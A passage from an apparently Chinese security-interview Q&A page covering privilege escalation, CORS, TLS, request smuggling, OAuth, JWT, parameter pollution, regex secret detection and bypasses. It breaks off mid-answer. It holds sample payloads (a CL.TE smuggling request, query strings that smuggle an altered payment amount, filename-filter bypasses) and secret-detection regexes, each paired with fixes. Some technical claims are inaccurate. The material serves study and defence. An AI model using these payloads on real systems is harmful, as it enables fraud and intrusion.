title="哪些账户状态会导致预期外的风险："></a>哪些账户状态会导致预期外的风险：</h3><ul><li>注销账户仍可进行操作。</li><li>禁用账户绕过禁用逻辑。</li><li>风控账户执行敏感操作。</li><li>司法冻结账户进行资金转移。</li></ul><hr><h3 id="身份标识明文传输会导致的风险："><a href="#身份标识明文传输会导致的风险：" class="headerlink" title="身份标识明文传输会导致的风险："></a>身份标识明文传输会导致的风险：</h3><ul><li>身份盗用：攻击者可通过截获明文身份标识，伪装成其他用户。</li><li>会话劫持：攻击者可能通过明文身份标识接管用户会话。</li></ul><hr><h3 id="水平越权触发点会存在的位置："><a href="#水平越权触发点会存在的位置：" class="headerlink" title="水平越权触发点会存在的位置："></a>水平越权触发点会存在的位置：</h3><ul><li>Cookies：被恶意修改以访问其他用户会话。</li><li>自定义Header：如X-Custom-Header被利用进行越权访问。</li><li>URL Path：路径遍历或操作其他用户资源。</li><li>URL Param Value：参数值被修改以访问未授权资源。</li><li>URL Param JSON：JSON参数被篡改导致越权。</li><li>Body Form、Body JSON、Body XML：请求体中数据被篡改。</li><li>自定义协议的自定义字段：用于越权访问的隐藏参数。</li></ul><hr><h3 id="水平越权有哪几种检测方式："><a href="#水平越权有哪几种检测方式：" class="headerlink" title="水平越权有哪几种检测方式："></a>水平越权有哪几种检测方式：</h3><ul><li>枚举检测：对数字ID进行递增或递减测试。</li><li>账户互测：使用两个不同权限账户相互访问资源。</li></ul><hr><h3 id="通过数字加减遍历或通过两个账号互测的方式进行水平越权测试的优劣势："><a href="#通过数字加减遍历或通过两个账号互测的方式进行水平越权测试的优劣势：" class="headerlink" title="通过数字加减遍历或通过两个账号互测的方式进行水平越权测试的优劣势："></a>通过数字加减遍历或通过两个账号互测的方式进行水平越权测试的优劣势：</h3><ul><li>数字加减遍历：<ul><li>优势：直接针对数字型资源ID，操作简单。</li><li>劣势：只能检测连续数字ID，可能遗漏非连续或非数字ID的越权，且对业务有损。</li></ul></li><li>账号互测：<ul><li>优势：无需遍历，降低被发现风险，不会对他人数据产生影响。</li><li>劣势：配置多个账号测试较为繁琐，当参数多且相互关联时效率较低。</li></ul></li></ul><hr><h3 id="CORS-原理、利用及修复？-1"><a href="#CORS-原理、利用及修复？-1" class="headerlink" title="CORS 原理、利用及修复？"></a>CORS 原理、利用及修复？</h3><p>CORS 原理：<br>跨域资源共享（CORS）是Web浏览器实现的一种安全机制，用于限制Web页面如何请求另一域名下的资源。其原理是通过在HTTP响应头中加入<code>Access-Control-Allow-Origin</code>字段来指定哪些外部域可以访问该资源。</p><p>利用方式：<br>攻击者可能利用不当配置的CORS策略，使得恶意网站能够访问或修改目标域下的敏感数据。</p><h2 id="修复方案：-配置严格的CORS策略，仅允许信任的源访问资源。-使用预检请求（OPTIONS请求），在实际请求之前进行权限校验。"><a href="#修复方案：-配置严格的CORS策略，仅允许信任的源访问资源。-使用预检请求（OPTIONS请求），在实际请求之前进行权限校验。" class="headerlink" title="修复方案：- 配置严格的CORS策略，仅允许信任的源访问资源。- 使用预检请求（OPTIONS请求），在实际请求之前进行权限校验。"></a>修复方案：<br>- 配置严格的CORS策略，仅允许信任的源访问资源。<br>- 使用预检请求（OPTIONS请求），在实际请求之前进行权限校验。</h2><h3 id="某个APP的某个功能按钮是灰色不可用状态，如何绕过其限制？"><a href="#某个APP的某个功能按钮是灰色不可用状态，如何绕过其限制？" class="headerlink" title="某个APP的某个功能按钮是灰色不可用状态，如何绕过其限制？"></a>某个APP的某个功能按钮是灰色不可用状态，如何绕过其限制？</h3><ul><li>修改前端按钮属性：直接修改前端页面元素的属性，使其可用。</li><li>分析后端接口：检查按钮对应的后端API，尝试直接调用接口以绕过前端限制。</li><li>多协议测试：尝试通过不同协议（HTTP、WSDL、REST、GraphQL）调用API，看是否能绕过限制。</li><li>跨平台测试：如果APP上按钮不可用，尝试在PC或其他平台上操作，看是否能绕过限制。</li></ul><hr><h3 id="流程绕过漏洞如何抽象理解归类？"><a href="#流程绕过漏洞如何抽象理解归类？" class="headerlink" title="流程绕过漏洞如何抽象理解归类？"></a>流程绕过漏洞如何抽象理解归类？</h3><ul><li>状态变更不一致：创建时权限校验严格，后续状态变更时权限要求不一致。</li><li>步骤要求不一致：流程中某个步骤要求严格，后续步骤要求不一致，如输入密码后未校验。</li><li>并发逻辑控制：并发执行流程，如多窗口同时支付，使优惠多次使用。</li><li>特殊时期逻辑绕过：如大促时期校验机制降级，导致流程绕过。</li><li>逻辑控制缺陷：开发中逻辑控制不严谨，如多条件判断中遗漏关键校验。</li></ul><hr><h3 id="TLS-1-2-协议交互过程以及攻击方法？"><a href="#TLS-1-2-协议交互过程以及攻击方法？" class="headerlink" title="TLS 1.2 协议交互过程以及攻击方法？"></a><strong>TLS 1.2 协议交互过程以及攻击方法？</strong></h3><p><strong>TLS 1.2 交互过程</strong>：</p><ol><li><strong>客户端 Hello</strong>：客户端向服务器发送支持的 TLS 版本、加密套件、随机数等。</li><li><strong>服务器 Hello</strong>：服务器选择 TLS 版本、加密算法，并返回自己的证书。</li><li><strong>密钥交换</strong>：基于 RSA 或 ECDHE 交换密钥，协商对称加密密钥。</li><li><strong>Finished</strong>：双方使用协商出的密钥完成握手，开始加密通信。</li></ol><p><strong>攻击方法</strong>：</p><ul><li><strong>TLS 降级攻击</strong>：攻击者干扰 TLS 握手，迫使客户端使用较低版本的 TLS（如 POODLE）。</li><li><strong>中间人攻击（MITM）</strong>：攻击者拦截并修改 TLS 握手，插入恶意 CA 证书，解密通信。</li><li><strong>会话劫持</strong>：通过窃取会话票据（Session Ticket）获取用户会话。</li><li><strong>BEAST 攻击</strong>：利用 CBC 模式填充漏洞，破解会话密文。</li></ul><h2 id="修复方案：-强制使用-TLS-1-2-，禁用低版本。-启用-HSTS，防止降级攻击。-使用-PFS（Perfect-Forward-Secrecy），防止密钥泄露影响历史数据。"><a href="#修复方案：-强制使用-TLS-1-2-，禁用低版本。-启用-HSTS，防止降级攻击。-使用-PFS（Perfect-Forward-Secrecy），防止密钥泄露影响历史数据。" class="headerlink" title="修复方案：- 强制使用 TLS 1.2+，禁用低版本。- 启用 HSTS，防止降级攻击。- 使用 PFS（Perfect Forward Secrecy），防止密钥泄露影响历史数据。"></a><strong>修复方案</strong>：<br>- 强制使用 TLS 1.2+，禁用低版本。<br>- 启用 HSTS，防止降级攻击。<br>- 使用 PFS（Perfect Forward Secrecy），防止密钥泄露影响历史数据。</h2><h3 id="HTTP-请求走私（HTTP-Request-Smuggling）原理"><a href="#HTTP-请求走私（HTTP-Request-Smuggling）原理" class="headerlink" title="HTTP 请求走私（HTTP Request Smuggling）原理"></a><strong>HTTP 请求走私（HTTP Request Smuggling）原理</strong></h3><p><strong>漏洞原理</strong>：<br>HTTP 请求走私是由于服务器对 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 解析不一致导致的漏洞，攻击者可以通过构造特殊的 HTTP 请求，使代理服务器和目标服务器解析不同步，导致：</p><ul><li>窃取其他用户的请求数据</li><li>绕过身份验证</li><li>触发缓存污染</li></ul><h2 id="利用方式：-CL-TE-攻击：-修复方案：-统一-Content-Length-和-Transfer-Encoding-的解析逻辑。-在-Web-服务器和代理服务器中禁用-Transfer-Encoding-chunked。-使用最新版本的-Web-服务器，如-Nginx、Apache，修复已知漏洞。"><a href="#利用方式：-CL-TE-攻击：-修复方案：-统一-Content-Length-和-Transfer-Encoding-的解析逻辑。-在-Web-服务器和代理服务器中禁用-Transfer-Encoding-chunked。-使用最新版本的-Web-服务器，如-Nginx、Apache，修复已知漏洞。" class="headerlink" title="利用方式：- CL.TE 攻击：  修复方案：- 统一 Content-Length 和 Transfer-Encoding 的解析逻辑。- 在 Web 服务器和代理服务器中禁用 Transfer-Encoding: chunked。- 使用最新版本的 Web 服务器，如 Nginx、Apache，修复已知漏洞。"></a><strong>利用方式</strong>：<br>- <strong>CL.TE 攻击</strong>：<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br></pre></td></tr></table></figure><br><strong>修复方案</strong>：<br>- 统一 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 的解析逻辑。<br>- 在 Web 服务器和代理服务器中禁用 <code>Transfer-Encoding: chunked</code>。<br>- 使用最新版本的 Web 服务器，如 Nginx、Apache，修复已知漏洞。</h2><h3 id="DNSSEC-能解决什么场景问题？"><a href="#DNSSEC-能解决什么场景问题？" class="headerlink" title="DNSSEC 能解决什么场景问题？"></a><strong>DNSSEC 能解决什么场景问题？</strong></h3><p><strong>作用</strong>：<br>DNSSEC（DNS Security Extensions）用于提供 DNS 解析数据的完整性和真实性，防止 DNS 劫持、缓存污染等攻击。</p><p><strong>适用场景</strong>：</p><ul><li>防止 <strong>DNS 伪造</strong>：利用数字签名验证 DNS 记录的真实性。</li><li><strong>防缓存投毒</strong>：确保解析器获取的是正确的 DNS 记录，而不是攻击者篡改的数据。</li></ul><h2 id="限制：-DNSSEC-不能加密-DNS-查询内容，仍然容易被监控。-部署复杂，且需要上级-DNS-服务器支持。"><a href="#限制：-DNSSEC-不能加密-DNS-查询内容，仍然容易被监控。-部署复杂，且需要上级-DNS-服务器支持。" class="headerlink" title="限制：- DNSSEC 不能加密 DNS 查询内容，仍然容易被监控。- 部署复杂，且需要上级 DNS 服务器支持。"></a><strong>限制</strong>：<br>- DNSSEC 不能加密 DNS 查询内容，仍然容易被监控。<br>- 部署复杂，且需要上级 DNS 服务器支持。</h2><h3 id="DNS-记录（DS、PTR、TXT）类型的常见作用？"><a href="#DNS-记录（DS、PTR、TXT）类型的常见作用？" class="headerlink" title="DNS 记录（DS、PTR、TXT）类型的常见作用？"></a><strong>DNS 记录（DS、PTR、TXT）类型的常见作用？</strong></h3><ul><li><strong>DS（Delegation Signer）</strong>：DNSSEC 相关记录，存储子域的公钥信息。</li><li><strong>PTR（Pointer Record）</strong>：用于反向 DNS 解析，将 IP 地址映射回域名，常用于邮件服务器验证。</li><li><strong>TXT（Text Record）</strong>：存储任意文本数据，常用于 SPF 记录、防垃圾邮件等。</li></ul><h2 id="示例：-SPF-记录（TXT）：-作用：指定允许的邮件发送服务器，防止伪造邮件。"><a href="#示例：-SPF-记录（TXT）：-作用：指定允许的邮件发送服务器，防止伪造邮件。" class="headerlink" title="示例：- SPF 记录（TXT）：    作用：指定允许的邮件发送服务器，防止伪造邮件。"></a><strong>示例</strong>：<br>- <strong>SPF 记录（TXT）</strong>：<br>  <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com TXT &quot;v=spf1 ip4:192.168.1.1 -all&quot;</span><br></pre></td></tr></table></figure><br>  作用：指定允许的邮件发送服务器，防止伪造邮件。</h2><h3 id="将暂时不用的域名解析到-1-1-1-1-有什么好处和坏处？"><a href="#将暂时不用的域名解析到-1-1-1-1-有什么好处和坏处？" class="headerlink" title="将暂时不用的域名解析到 1.1.1.1 有什么好处和坏处？"></a><strong>将暂时不用的域名解析到 1.1.1.1 有什么好处和坏处？</strong></h3><p><strong>好处</strong>：</p><ul><li>避免原 IP 解析，防止解析记录暴露，减少攻击风险。</li><li>加快全球解析同步速度。</li></ul><p><strong>坏处</strong>：</p><ul><li>1.1.1.1 是 Cloudflare CDN 的 IP，可能导致误封或安全风险。</li><li>可能影响未来恢复使用，导致解析问题。</li></ul><h2 id="更安全的做法：-直接删除域名解析记录，或设置-NXDOMAIN-响应。"><a href="#更安全的做法：-直接删除域名解析记录，或设置-NXDOMAIN-响应。" class="headerlink" title="更安全的做法：- 直接删除域名解析记录，或设置 NXDOMAIN 响应。"></a><strong>更安全的做法</strong>：<br>- 直接删除域名解析记录，或设置 <code>NXDOMAIN</code> 响应。</h2><h3 id="OAuth-除了-redirect-uri-绕过问题外，还有哪些风险以及如何修复？"><a href="#OAuth-除了-redirect-uri-绕过问题外，还有哪些风险以及如何修复？" class="headerlink" title="OAuth 除了 redirect_uri 绕过问题外，还有哪些风险以及如何修复？"></a><strong>OAuth 除了 redirect_uri 绕过问题外，还有哪些风险以及如何修复？</strong></h3><p><strong>常见风险</strong>：</p><ul><li><strong>State 参数缺失</strong>：导致 CSRF 攻击，攻击者可劫持用户授权。</li><li><strong>Client Secret 泄露</strong>：攻击者伪造请求，冒充合法客户端获取访问权限。</li><li><strong>错误的 token 存储</strong>：访问令牌被存储在客户端，容易被盗用。</li></ul><h2 id="修复方案：-强制校验-state-参数，防止-CSRF：-严格验证-redirect-uri-，避免重定向到攻击者站点：-使用短生命周期-Token，避免长期暴露：-Access-Token-仅可使用一次-使用-Refresh-Token-进行长时间会话维护-全程使用-HTTPS，防止-Token-被窃听"><a href="#修复方案：-强制校验-state-参数，防止-CSRF：-严格验证-redirect-uri-，避免重定向到攻击者站点：-使用短生命周期-Token，避免长期暴露：-Access-Token-仅可使用一次-使用-Refresh-Token-进行长时间会话维护-全程使用-HTTPS，防止-Token-被窃听" class="headerlink" title="修复方案：- 强制校验 state 参数，防止 CSRF：  - **严格验证 redirect_uri**，避免重定向到攻击者站点：  - 使用短生命周期 Token，避免长期暴露：  - Access Token 仅可使用一次  - 使用 Refresh Token 进行长时间会话维护  - 全程使用 HTTPS，防止 Token 被窃听"></a><strong>修复方案</strong>：<br>- <strong>强制校验 <code>state</code> 参数</strong>，防止 CSRF：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">state = generate_secure_token()</span><br><span class="line">session[<span class="string">&quot;oauth_state&quot;</span>] = state</span><br><span class="line">redirect_uri = <span class="string">f&quot;https://auth.com/oauth?state=<span class="subst">&#123;state&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><br>- **严格验证 <code>redirect_uri</code>**，避免重定向到攻击者站点：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> redirect_uri.startswith(<span class="string">&quot;https://trusted-site.com&quot;</span>):</span><br><span class="line">    abort(<span class="number">403</span>)</span><br></pre></td></tr></table></figure><br>- <strong>使用短生命周期 Token，避免长期暴露</strong>：<br>  - Access Token 仅可使用一次<br>  - 使用 Refresh Token 进行长时间会话维护<br>  - 全程使用 HTTPS，防止 Token 被窃听</h2><h3 id="JWT-相较于-SESSION-的优势？"><a href="#JWT-相较于-SESSION-的优势？" class="headerlink" title="JWT 相较于 SESSION 的优势？"></a><strong>JWT 相较于 SESSION 的优势？</strong></h3><p><strong>JWT 优势</strong>：</p><ul><li><strong>无状态</strong>：JWT 不依赖服务器存储会话数据，适用于分布式系统。</li><li><strong>性能优化</strong>：SESSION 需要存储在服务器，而 JWT 通过客户端传输，减少了服务器负担。</li><li><strong>可扩展性</strong>：JWT 可携带自定义声明（claims），支持多种身份验证场景。</li></ul><h2 id="安全注意点：-JWT-一旦泄露，攻击者可以长期使用，建议使用短生命周期-Token。-需使用-RS256（非对称加密）-或-HS256（对称加密），避免-none-算法漏洞。"><a href="#安全注意点：-JWT-一旦泄露，攻击者可以长期使用，建议使用短生命周期-Token。-需使用-RS256（非对称加密）-或-HS256（对称加密），避免-none-算法漏洞。" class="headerlink" title="安全注意点：- JWT 一旦泄露，攻击者可以长期使用，建议使用短生命周期 Token。- 需使用 RS256（非对称加密） 或 HS256（对称加密），避免 none 算法漏洞。"></a><strong>安全注意点</strong>：<br>- JWT 一旦泄露，攻击者可以长期使用，建议使用短生命周期 Token。<br>- 需使用 <strong>RS256（非对称加密）</strong> 或 <strong>HS256（对称加密）</strong>，避免 <code>none</code> 算法漏洞。</h2><h3 id="如何通过-HTTP-参数污染将-uid-9527-amount-100-中的-uid-改为-10086？"><a href="#如何通过-HTTP-参数污染将-uid-9527-amount-100-中的-uid-改为-10086？" class="headerlink" title="如何通过 HTTP 参数污染将 uid=9527&amp;amount=100 中的 uid 改为 10086？"></a><strong>如何通过 HTTP 参数污染将 <code>uid=9527&amp;amount=100</code> 中的 uid 改为 10086？</strong></h3><p><strong>漏洞原理</strong>：<br>HTTP 参数污染（HPP）是指通过重复提交相同参数，导致服务器在解析时出现不一致，从而实现攻击。</p><p><strong>利用方式</strong>：</p><ul><li><p><strong>服务器处理参数方式不同</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /transfer?uid=9527&amp;uid=10086&amp;amount=100</span><br></pre></td></tr></table></figure><ul><li>某些服务器取<strong>第一个参数</strong>（<code>uid=9527</code>）</li><li>某些服务器取<strong>最后一个参数</strong>（<code>uid=10086</code>）</li></ul></li><li><p><strong>编码绕过</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /transfer?uid=9527%26uid%3D10086&amp;amount=100</span><br></pre></td></tr></table></figure><ul><li><code>%26</code> 是 <code>&amp;</code> 的 URL 编码，导致 <code>uid=9527&amp;uid=10086</code> 被解析。</li></ul></li></ul><h2 id="修复方案：-严格限制参数格式，拒绝重复参数。-统一服务器端参数解析方式，确保参数唯一性。"><a href="#修复方案：-严格限制参数格式，拒绝重复参数。-统一服务器端参数解析方式，确保参数唯一性。" class="headerlink" title="修复方案：- 严格限制参数格式，拒绝重复参数。- 统一服务器端参数解析方式，确保参数唯一性。"></a><strong>修复方案</strong>：<br>- 严格限制参数格式，拒绝重复参数。<br>- 统一服务器端参数解析方式，确保参数唯一性。</h2><h3 id="当网关对所有请求会进行一次强制-urldecode，存在一个参数-uid-9527-remark-充话费-amount-100-的接口，仅备注字段（remark）可控时，如何改变最终的金额字段（amount）？"><a href="#当网关对所有请求会进行一次强制-urldecode，存在一个参数-uid-9527-remark-充话费-amount-100-的接口，仅备注字段（remark）可控时，如何改变最终的金额字段（amount）？" class="headerlink" title="当网关对所有请求会进行一次强制 urldecode，存在一个参数 uid=9527&amp;remark=充话费&amp;amount=100 的接口，仅备注字段（remark）可控时，如何改变最终的金额字段（amount）？"></a><strong>当网关对所有请求会进行一次强制 urldecode，存在一个参数 <code>uid=9527&amp;remark=充话费&amp;amount=100</code> 的接口，仅备注字段（remark）可控时，如何改变最终的金额字段（amount）？</strong></h3><p><strong>漏洞原理</strong>：<br>如果网关会强制 <code>urldecode</code>，攻击者可以利用 <code>%26</code>（即 <code>&amp;</code>）或 <code>%3D</code>（即 <code>=</code>）进行解析绕过，篡改 <code>amount</code>。</p><p><strong>利用方式</strong>：<br>GET &#x2F;pay?uid&#x3D;9527&amp;remark&#x3D;充话费%26amount%3D100000<br>如果服务器在 <code>urldecode</code> 后处理：<br>uid&#x3D;9527&amp;remark&#x3D;充话费&amp;amount&#x3D;100000<br>此时 <code>amount</code> 被成功修改为 100000。</p><h2 id="修复方案：-对输入数据进行二次编码检查，避免-urldecode-解析参数。-使用-JSON-传输数据，避免-query-string-参数解析问题。"><a href="#修复方案：-对输入数据进行二次编码检查，避免-urldecode-解析参数。-使用-JSON-传输数据，避免-query-string-参数解析问题。" class="headerlink" title="修复方案：- 对输入数据进行二次编码检查，避免 urldecode 解析参数。- 使用 JSON 传输数据，避免 query string 参数解析问题。"></a><strong>修复方案</strong>：<br>- <strong>对输入数据进行二次编码检查</strong>，避免 <code>urldecode</code> 解析参数。<br>- <strong>使用 JSON 传输数据</strong>，避免 <code>query string</code> 参数解析问题。</h2><h3 id="哪些漏洞的测试对业务有损？如何避免？"><a href="#哪些漏洞的测试对业务有损？如何避免？" class="headerlink" title="哪些漏洞的测试对业务有损？如何避免？"></a><strong>哪些漏洞的测试对业务有损？如何避免？</strong></h3><p><strong>高风险测试</strong>：</p><ul><li><strong>SQL 注入</strong>：可能导致数据库崩溃。</li><li><strong>CSRF 测试</strong>：可能导致用户误操作。</li><li><strong>逻辑漏洞</strong>：批量刷单、支付绕过等测试可能影响业务数据。</li></ul><h2 id="避免方案：-在-测试环境-进行验证，避免直接在生产环境测试。-对关键-API-限制高频请求，防止影响用户体验。"><a href="#避免方案：-在-测试环境-进行验证，避免直接在生产环境测试。-对关键-API-限制高频请求，防止影响用户体验。" class="headerlink" title="避免方案：- 在 测试环境 进行验证，避免直接在生产环境测试。- 对关键 API 限制高频请求，防止影响用户体验。"></a><strong>避免方案</strong>：<br>- 在 <strong>测试环境</strong> 进行验证，避免直接在生产环境测试。<br>- 对关键 API 限制高频请求，防止影响用户体验。</h2><h3 id="漏洞修复一般分为哪几个步骤？"><a href="#漏洞修复一般分为哪几个步骤？" class="headerlink" title="漏洞修复一般分为哪几个步骤？"></a><strong>漏洞修复一般分为哪几个步骤？</strong></h3><ol><li><strong>漏洞确认</strong>：分析漏洞是否真实存在。</li><li><strong>风险评估</strong>：确定漏洞的影响范围和紧急程度。</li><li><strong>修复方案</strong>：制定修复方案，可能包括代码修复、配置调整等。</li><li><strong>修复验证</strong>：测试修复是否生效，确保无新问题引入。</li></ol><hr><h3 id="如何制定漏洞的修复时间？需要考虑哪些因素？"><a href="#如何制定漏洞的修复时间？需要考虑哪些因素？" class="headerlink" title="如何制定漏洞的修复时间？需要考虑哪些因素？"></a><strong>如何制定漏洞的修复时间？需要考虑哪些因素？</strong></h3><p><strong>关键考虑因素</strong>：</p><ul><li><strong>漏洞严重度</strong>（高危漏洞需立即修复）。</li><li><strong>业务影响</strong>（避免修复影响核心业务）。</li><li><strong>修复成本</strong>（代码改动、测试资源）。</li></ul><h2 id="最佳实践：-P0（高危）：24-小时内修复。-P1（中危）：1-周内修复。-P2（低危）：1-个月内修复。"><a href="#最佳实践：-P0（高危）：24-小时内修复。-P1（中危）：1-周内修复。-P2（低危）：1-个月内修复。" class="headerlink" title="最佳实践：- P0（高危）：24 小时内修复。- P1（中危）：1 周内修复。- P2（低危）：1 个月内修复。"></a><strong>最佳实践</strong>：<br>- <strong>P0（高危）</strong>：24 小时内修复。<br>- <strong>P1（中危）</strong>：1 周内修复。<br>- <strong>P2（低危）</strong>：1 个月内修复。</h2><h3 id="如何有效提升漏洞修复效率？"><a href="#如何有效提升漏洞修复效率？" class="headerlink" title="如何有效提升漏洞修复效率？"></a><strong>如何有效提升漏洞修复效率？</strong></h3><h2 id="优化方法：-漏洞分类，制定标准化修复流程。-自动化测试，减少回归测试成本。-开发安全培训，提高修复能力。"><a href="#优化方法：-漏洞分类，制定标准化修复流程。-自动化测试，减少回归测试成本。-开发安全培训，提高修复能力。" class="headerlink" title="优化方法：- 漏洞分类，制定标准化修复流程。- 自动化测试，减少回归测试成本。- 开发安全培训，提高修复能力。"></a><strong>优化方法</strong>：<br>- <strong>漏洞分类</strong>，制定标准化修复流程。<br>- <strong>自动化测试</strong>，减少回归测试成本。<br>- <strong>开发安全培训</strong>，提高修复能力。</h2><h3 id="什么类型漏洞是代码审计无法准确判断存在与否的？"><a href="#什么类型漏洞是代码审计无法准确判断存在与否的？" class="headerlink" title="什么类型漏洞是代码审计无法准确判断存在与否的？"></a><strong>什么类型漏洞是代码审计无法准确判断存在与否的？</strong></h3><p><strong>常见难以判断的漏洞</strong>：</p><ul><li><strong>业务逻辑漏洞</strong>：如支付接口绕过、积分漏洞，依赖具体业务逻辑。</li><li><strong>权限控制问题</strong>：仅看代码难以判断 API 是否可被未授权用户访问。</li><li><strong>时间相关漏洞</strong>：如竞态条件（Race Condition），代码静态分析难以检测。</li><li><strong>加密安全性</strong>：仅从代码无法判断加密算法的强度，需结合实际使用环境分析。</li></ul><h2 id="解决方案：-结合动态分析（DAST）-人工测试，验证漏洞是否可被利用。"><a href="#解决方案：-结合动态分析（DAST）-人工测试，验证漏洞是否可被利用。" class="headerlink" title="解决方案：- 结合动态分析（DAST）+人工测试，验证漏洞是否可被利用。"></a><strong>解决方案</strong>：<br>- 结合动态分析（DAST）+人工测试，验证漏洞是否可被利用。</h2><h3 id="密钥的识别的正则如何写？"><a href="#密钥的识别的正则如何写？" class="headerlink" title="密钥的识别的正则如何写？"></a><strong>密钥的识别的正则如何写？</strong></h3><h2 id="匹配-API-Key、JWT、OAuth-Token：-i-apikey-token-secret-password-bearer-s-s-A-Za-z0-9-20-60-匹配-AWS-访问密钥：AKIA-0-9A-Z-16-匹配私钥：-BEGIN-RSA-DSA-EC-PRIVATE-KEY-修复方案：-禁止密钥硬编码，使用环境变量或配置管理工具存储敏感信息。"><a href="#匹配-API-Key、JWT、OAuth-Token：-i-apikey-token-secret-password-bearer-s-s-A-Za-z0-9-20-60-匹配-AWS-访问密钥：AKIA-0-9A-Z-16-匹配私钥：-BEGIN-RSA-DSA-EC-PRIVATE-KEY-修复方案：-禁止密钥硬编码，使用环境变量或配置管理工具存储敏感信息。" class="headerlink" title="匹配 API Key、JWT、OAuth Token：(?i)(apikey|token|secret|password|bearer)\s*[:=]\s*[&quot;&#39;]?([A-Za-z0-9\-_]{20,60})[&quot;&#39;]?匹配 AWS 访问密钥：AKIA[0-9A-Z]{16}匹配私钥：-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----修复方案：- 禁止密钥硬编码，使用环境变量或配置管理工具存储敏感信息。"></a><strong>匹配 API Key、JWT、OAuth Token</strong>：<br><code>(?i)(apikey|token|secret|password|bearer)\s*[:=]\s*[&quot;&#39;]?([A-Za-z0-9\-_]&#123;20,60&#125;)[&quot;&#39;]?</code><br><strong>匹配 AWS 访问密钥</strong>：<br><code>AKIA[0-9A-Z]&#123;16&#125;</code><br><strong>匹配私钥</strong>：<br><code>-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----</code><br><strong>修复方案</strong>：<br>- 禁止密钥硬编码，使用环境变量或配置管理工具存储敏感信息。</h2><h3 id="正则-a-会存在哪些风险？"><a href="#正则-a-会存在哪些风险？" class="headerlink" title="正则 (a+)+ 会存在哪些风险？"></a><strong>正则 <code>(a+)+</code> 会存在哪些风险？</strong></h3><p><strong>风险点</strong>：</p><ul><li><strong>正则回溯爆炸（ReDoS）</strong>：当输入较长的 <code>a</code> 时，正则引擎可能会产生指数级回溯，导致 CPU 计算量激增，可能被 DoS 攻击利用。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import re; re.match(&quot;(a+)+&quot;, &quot;a&quot; * 100000)&#x27;</span></span><br></pre></td></tr></table></figure>可能导致 CPU 挂死。</li></ul><h2 id="修复方案：-避免使用嵌套重复匹配-a-，改用-a-限制匹配范围。-使用非回溯正则（如-RE2-引擎）。"><a href="#修复方案：-避免使用嵌套重复匹配-a-，改用-a-限制匹配范围。-使用非回溯正则（如-RE2-引擎）。" class="headerlink" title="修复方案：- 避免使用嵌套重复匹配 (a+)+，改用 ^a+$ 限制匹配范围。- 使用非回溯正则（如 RE2 引擎）。"></a><strong>修复方案</strong>：<br>- 避免使用嵌套重复匹配 <code>(a+)+</code>，改用 <code>^a+$</code> 限制匹配范围。<br>- 使用<strong>非回溯正则</strong>（如 RE2 引擎）。</h2><h3 id="程序对读取的文件名的正则为-markdown-，如何绕过？"><a href="#程序对读取的文件名的正则为-markdown-，如何绕过？" class="headerlink" title="程序对读取的文件名的正则为 /\.markdown/，如何绕过？"></a><strong>程序对读取的文件名的正则为 <code>/\.markdown/</code>，如何绕过？</strong></h3><p><strong>绕过方式</strong>：</p><ul><li><strong>大小写绕过</strong>：<code>readme.Markdown</code></li><li><strong>编码绕过</strong>：<code>readme.%6Darkdown</code></li><li><strong>目录穿越</strong>：<code>./readme.markdown./</code></li><li><strong>Unicode 绕过</strong>：<code>readme.mar𝗸down</code>（利用 Unicode 变体）</li><li><strong>双写绕过</strong>：<code>readme..markdown</code></li></ul><h2 id="修复方案：-严格使用-basename-解析路径："><a href="#修复方案：-严格使用-basename-解析路径：" class="headerlink" title="修复方案：- 严格使用 basename 解析路径：  "></a><strong>修复方案</strong>：<br>- <strong>严格使用 <code>basename</code> 解析路径</strong>：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">filename = os.path.basename(user_input)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> filename.endswith(<span class="string">&quot;.markdown&quot;</span>):</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Invalid file type&quot;</span>)</span><br></pre></td></tr></table></figure></h2><h3 id="程序对请求的-URL-的正则为-http-feei-cn-，如何绕过？"><a href="#程序对请求的-URL-的正则为-http-feei-cn-，如何绕过？" class="headerlink" title="程序对请求的 URL 的正则为 /^http\:\/\/.*\.feei.cn($|\(\/[^&lt;&gt;\&quot;&quot;]*\))/，如何绕过？"></a><strong>程序对请求的 URL 的正则为 <code>/^http\:\/\/.*\.feei.cn($|\(\/[^&lt;&gt;\&quot;&quot;]*\))/</code>，如何绕过？</strong></h3><p><strong>绕过方式</strong>：</p><ul><li><strong>编码绕过</strong>：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 